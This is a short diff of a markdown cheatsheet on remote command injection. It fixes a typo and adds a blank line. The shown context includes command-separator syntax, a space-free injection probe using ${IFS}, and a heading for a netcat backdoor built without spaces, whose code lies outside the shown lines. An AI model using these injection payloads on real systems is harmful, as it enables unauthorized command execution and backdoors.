@@ -1,6 +1,7 @@
 Remote Command Exec Cheatsheet
 
 **Executing Commands**
+
 Various ways of separating Commands:<br>
 ``` blah;blah2 ```
 
@@ -19,7 +20,7 @@ Various ways of separating Commands:<br>
 **Shell commands without spaces**
 
 Using Internal Field Separator (IFS):<br>
-Test for cmd injection withouot spaces:<br>
+Test for cmd injection without spaces:<br>
 ``` sleep${IFS:0:1}20 ```<br>
 
 Example IFS netcat backdoor without spaces:<br>
